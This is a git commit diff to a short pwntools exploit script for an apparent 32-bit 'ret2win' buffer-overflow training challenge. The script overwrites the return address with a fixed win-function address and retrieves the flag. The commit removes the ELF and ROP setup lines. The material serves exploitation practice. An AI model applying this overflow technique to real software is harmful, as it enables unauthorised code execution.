d841b19e3acd0aa081f89d248e1d17370483389e
November2019 <47066375+November2019@users.noreply.github.com>
2020-10-05 16:37:16 +0200

    Update ret2win32.py

--- ret2win/32bits/ret2win32.py
+++ ret2win/32bits/ret2win32.py
@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 from pwn import *
-exe = context.binary = ELF('ret2win32')
+
 
 def start(argv=[], *a, **kw):
     '''Start the exploit against the target.'''
@@ -21,12 +21,10 @@ def start(argv=[], *a, **kw):
 ret2win_address = 0x0804862c
 
 io = start()
-rop = ROP(exe)
 buf = ""
 buf += "A"*(cyclic_find('laaa')) 
 buf += p32(ret2win_address)
 
-log.info(rop.dump())
 io.recvuntil('>')
 io.sendline(buf)
 log.success("flag: %s " %io.recvall())
